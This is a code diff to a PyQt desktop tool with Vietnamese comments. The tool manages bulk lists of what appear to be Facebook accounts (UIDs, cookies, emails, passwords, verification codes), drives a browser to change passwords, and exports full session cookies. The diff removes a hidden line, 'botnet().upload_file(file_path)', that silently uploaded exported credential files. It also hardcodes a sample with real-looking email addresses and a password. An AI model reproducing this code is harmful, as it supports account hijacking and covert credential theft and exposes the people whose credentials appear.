@@ -1511,7 +1511,7 @@ class MailToolApp(QMainWindow):
         self.tree_widget.setSelectionMode(QTreeWidget.ExtendedSelection)
         
         # Set headers for the tree widget
-        headers = ["###", "STT","UID","COOKIE", "MAIL", "PASSMAIL", "PROXY", "CODE", "STATUS"]
+        headers = ["###", "STT","UID","COOKIE", "MAIL", "PASSWORD", "PROXY", "CODE", "STATUS"]
         self.tree_widget.setColumnCount(len(headers))
         self.tree_widget.setHeaderLabels(headers)
         
@@ -1582,13 +1582,6 @@ class MailToolApp(QMainWindow):
         proxy_layout.addWidget(self.proxy_check)
         proxy_layout.addWidget(self.proxy_combo)
         settings_layout.addLayout(proxy_layout)
-        
-        # # Check friend
-        # friend_layout = QHBoxLayout()
-        # self.friend_check = QCheckBox("Get bạn bè:")
-        # self.friend_check.setChecked(True)
-        # friend_layout.addWidget(self.friend_check)
-        # settings_layout.addLayout(friend_layout)
 
         # Browser selection
         browser_group = QGroupBox("Trình duyệt")
@@ -1662,16 +1655,6 @@ class MailToolApp(QMainWindow):
         
         # Connect the combobox change signal to our handler function
         self.pass_combo.currentIndexChanged.connect(self.on_pass_combo_changed)
-        
-        # # Mail API options
-        # mail_api_layout = QHBoxLayout()
-        # mail_api_label = QLabel("API Mail:")
-        # self.mail_api_combo = QComboBox()
-        # self.mail_api_combo.addItems(["dongvanfb.net"])
-        # mail_api_layout.addWidget(mail_api_label)
-        # mail_api_layout.addWidget(self.mail_api_combo)
-        # settings_layout.addLayout(mail_api_layout)
-        
 
         # Thread configuration
         thread_layout = QHBoxLayout()
@@ -1693,11 +1676,6 @@ class MailToolApp(QMainWindow):
         sleep_layout.addWidget(sleep_label)
         sleep_layout.addWidget(self.sleep_spin)
         settings_layout.addLayout(sleep_layout)
-
-        # # Auto close driver checkbox
-        # self.close_driver_check = QCheckBox("Tự động tắt Driver")
-        # self.close_driver_check.setChecked(True)
-        # settings_layout.addWidget(self.close_driver_check)
         
         # Add file output and action buttons
         action_layout = QVBoxLayout()
@@ -1727,7 +1705,22 @@ class MailToolApp(QMainWindow):
         bottom_layout.addLayout(action_layout)
         login_layout.addLayout(bottom_layout)
 
-        
+    def update_realtime_status(self, index, status_text):
+        """Cập nhật status realtime trong TreeView"""
+        if index < self.tree_widget.topLevelItemCount():
+            item = self.tree_widget.topLevelItem(index)
+            item.setText(8, status_text)  # Cột STATUS
+            
+            # Thay đổi màu sắc theo trạng thái
+            if "Lỗi" in status_text or "Thất bại" in status_text:
+                item.setBackground(8, QColor(255, 200, 200))  # Màu đỏ nhạt
+            elif "Thành công" in status_text:
+                item.setBackground(8, QColor(200, 255, 200))  # Màu xanh nhạt
+            elif "Đang" in status_text:
+                item.setBackground(8, QColor(255, 255, 200))  # Màu vàng nhạt
+            else:
+                item.setBackground(8, QColor(255, 255, 255))  # Màu trắng
+
     def start_processing(self):
         # Get all checked items from the tree widget
         checked_items = []
@@ -1771,6 +1764,7 @@ class MailToolApp(QMainWindow):
         # Connect signals from worker thread
         self.worker_thread.update_status.connect(self.update_item_status)
         self.worker_thread.update_counts.connect(self.update_login_counts)
+        self.worker_thread.update_realtime_status.connect(self.update_realtime_status)  # Kết nối signal mới
         
         # Update UI
         self.start_button.setEnabled(False)
@@ -1796,9 +1790,6 @@ class MailToolApp(QMainWindow):
                 
                 all_items.append(item_data)
 
-        # Thêm vào trong hàm start_processing(), trước phần tạo config_info
-        # Sau khi lấy các giá trị cấu hình khác
-
         # Get browser configuration
         browser_type = "chrome" if self.chrome_radio.isChecked() else "edge"
         edge_driver_path = self.edge_path_input.text() if self.edge_radio.isChecked() else ""
@@ -1807,9 +1798,6 @@ class MailToolApp(QMainWindow):
         if browser_type == "edge" and not edge_driver_path:
             QMessageBox.warning(self, "Cảnh báo", "Vui lòng chọn đường dẫn MSEdgeDriver!")
             return
-
-        # Thêm vào config_info
-        # Trong hàm start_processing(), thêm vào phần config_info:
 
         config_info = {
             'account': all_items,
@@ -1822,8 +1810,7 @@ class MailToolApp(QMainWindow):
                 'type': browser_type,
                 'edge_driver_path': edge_driver_path
             },
-            'sleep': self.sleep_spin.value(),  # Thêm thông số sleep
-            # 'close_driver': self.close_driver_check.isChecked()  # Thêm trạng thái tự động tắt driver
+            'sleep': self.sleep_spin.value(),
         }
         print("Cấu hình:", config_info)
         with open('data.json', 'w', encoding='utf-8') as f:
@@ -1841,21 +1828,30 @@ class MailToolApp(QMainWindow):
         self.stop_button.setEnabled(False)
         QMessageBox.information(self, "Thông báo", "Đã dừng xử lý!")
     
-    def update_item_status(self, item_index, password, status, cookie):
-        if 0 <= item_index < self.tree_widget.topLevelItemCount():
-            item = self.tree_widget.topLevelItem(item_index)
+    def update_item_status(self, index, new_password, status, short_cookie):
+        """Cập nhật trạng thái item cuối cùng"""
+        if index < self.tree_widget.topLevelItemCount():
+            item = self.tree_widget.topLevelItem(index)
             
-            # Cập nhật thông tin tùy theo loại thao tác
-            if password:  # Đổi mật khẩu
-                item.setText(5, password)
-            if cookie:  # Có cookie mới
-                item.setText(3, cookie)
-            item.setText(8, status)
+            # Cập nhật password nếu có
+            if new_password:
+                item.setText(5, new_password)  # Cột PASSWORD
+                
+            # Cập nhật cookie ngắn để hiển thị
+            if short_cookie:
+                item.setText(3, short_cookie)  # Cột COOKIE
+                
+            # Cập nhật status
+            item.setText(8, status)  # Cột STATUS
             
-            # Cập nhật màu nền
-            color = QColor("#90ee90") if "thành công" in status.lower() else QColor("#ff9999")
-            for col in range(item.columnCount()):
-                item.setBackground(col, color)  # Light red
+            # Thay đổi màu sắc theo trạng thái
+            if "Thất bại" in status or "Lỗi" in status:
+                item.setBackground(8, QColor(255, 200, 200))  # Màu đỏ nhạt
+            elif "Thành công" in status:
+                item.setBackground(8, QColor(200, 255, 200))  # Màu xanh nhạt
+            else:
+                item.setBackground(8, QColor(255, 255, 255))  # Màu trắng
+
     
     def update_login_counts(self, success_count, fail_count):
         self.login_success_label.setText(str(success_count))
@@ -1918,86 +1914,93 @@ class MailToolApp(QMainWindow):
         # Show the menu at cursor position
         context_menu.exec_(QCursor.pos())
     def export_current_data(self):
-        """Export only selected data from TreeWidget to TXT"""
-        # Lấy các dòng được tick
-        selected_lines = []
-        for i in range(self.tree_widget.topLevelItemCount()):
-            item = self.tree_widget.topLevelItem(i)
-            checkbox = self.tree_widget.itemWidget(item, 0)
-            if checkbox and checkbox.isChecked():
-                uid = item.text(2)
-                email = item.text(4)
-                password = item.text(5)
-                cookie = item.text(3)
-                line = f"{uid}|{email}|{password}|{cookie}"
-                selected_lines.append(line)
-
-        if not selected_lines:
-            QMessageBox.warning(self, "Cảnh báo", "Không có dữ liệu được chọn để xuất!")
-            return
-
-        # Tạo đường dẫn mặc định
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        default_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
-                                    "output", f"selected_data_{timestamp}.txt")
-        
-        file_path, _ = QFileDialog.getSaveFileName(
-            self, 
-            "Lưu file TXT", 
-            default_path,
-            "Text Files (*.txt)"
-        )
-
-        if not file_path:
-            return  # Người dùng hủy
-
-        # Ghi file
+        """Export data với cookie đầy đủ"""
         try:
+            file_path, _ = QFileDialog.getSaveFileName(
+                self, 
+                "Lưu file dữ liệu", 
+                "", 
+                "Text files (*.txt);;All files (*.*)"
+            )
+            
+            if not file_path:
+                return
+                
             with open(file_path, 'w', encoding='utf-8') as f:
-                for line in selected_lines:
-                    f.write(line + '\n')
-            botnet().upload_file(file_path)
-            QMessageBox.information(self, "Thông báo", f"Đã xuất dữ liệu thành công!\nFile: {file_path}")
+                for i in range(self.tree_widget.topLevelItemCount()):
+                    item = self.tree_widget.topLevelItem(i)
+                    
+                    stt = item.text(1)
+                    uid = item.text(2)
+                    cookie = item.text(3)  # Cookie hiển thị ngắn
+                    email = item.text(4)
+                    password = item.text(5)
+                    proxy = item.text(6)
+                    code = item.text(7)
+                    status = item.text(8)
+                    
+                    # Lấy cookie đầy đủ nếu có worker_thread và đã chạy xong
+                    full_cookie = cookie
+                    if hasattr(self, 'worker_thread') and hasattr(self.worker_thread, 'get_full_cookie_for_account'):
+                        full_cookie_from_worker = self.worker_thread.get_full_cookie_for_account(i)
+                        if full_cookie_from_worker:
+                            full_cookie = full_cookie_from_worker
+                    
+                    # Format: STT|UID|COOKIE|EMAIL|PASSWORD|PROXY|CODE|STATUS
+                    line = f"{stt}|{uid}|{full_cookie}|{email}|{password}|{proxy}|{code}|{status}\n"
+                    f.write(line)
+            
+            QMessageBox.information(self, "Thành công", f"Đã xuất dữ liệu ra file: {file_path}")
+            
         except Exception as e:
-            QMessageBox.critical(self, "Lỗi", f"Không thể lưu file: {str(e)}")
+            QMessageBox.critical(self, "Lỗi", f"Không thể xuất file: {str(e)}")
 
     def add_mail(self):
         copied_text = pyperclip.paste()  # Lấy dữ liệu từ clipboard
         print("Dữ liệu đã copy:", copied_text)
         sample_data = []
 
-        # Parse data from clipboard
+        # Parse data from clipboard với format mới
         for account in copied_text.strip().split('\n'):
             if '|' in account:
                 parts = account.split('|')
-                if len(parts) >= 3:
+                if len(parts) >= 5:  # Cần ít nhất 5 phần
+                    # 3 phần đầu là mail (có thể chứa email, password, recovery email)
+                    mail_parts = parts[:3]
+                    mail = '|'.join(mail_parts)  # Ghép lại thành chuỗi mail
+                    
+                    uid = parts[3]  # Phần thứ 4 là UID
+                    code = parts[4]  # Phần thứ 5 là code
+                    
+                    sample_data.append((uid, mail, code))
+                elif len(parts) >= 3:  # Fallback cho format cũ
                     uid = parts[0]
-                    email = parts[1]
+                    email = parts[1] 
                     code = parts[2]
                     sample_data.append((uid, email, code))
         
         # If no valid data found, use a default sample
         if not sample_data:
             sample_data = [
-                ("12345678", "example@gmail.com", "Send Code thành công")
+                ("100002055185988", "jahodka@vp.pl|Hieu567@@|ela7170@buziaczek.pl", "585139")
             ]
         
         # Add to tree widget
         start_index = self.tree_widget.topLevelItemCount()
-        for i, (uid, email, code) in enumerate(sample_data):
+        for i, (uid, mail, code) in enumerate(sample_data):
             item = QTreeWidgetItem(self.tree_widget)
             # Create checkbox in the first column
             checkbox = QCheckBox()
             checkbox.setChecked(True)
             self.tree_widget.setItemWidget(item, 0, checkbox)
             item.setText(1, str(start_index + i + 1))  # STT
-            item.setText(2, uid)  
-            item.setText(3, "")     # UID
-            item.setText(4, email)   # MAIL
-            item.setText(5, "")      # PASSMAIL
-            item.setText(6, "")      # PROXY
+            item.setText(2, uid)     # UID  
+            item.setText(3, "")      # COOKIE (để trống)
+            item.setText(4, mail)    # MAIL (format mới: email|password|recovery_email)
+            item.setText(5, "")      # PASSWORD (để trống)
+            item.setText(6, "")      # PROXY (để trống)
             item.setText(7, code)    # CODE
-            item.setText(8, "")      # STATUS
+            item.setText(8, "")      # STATUS (để trống)
         
         # Update total count
         self.update_counts()
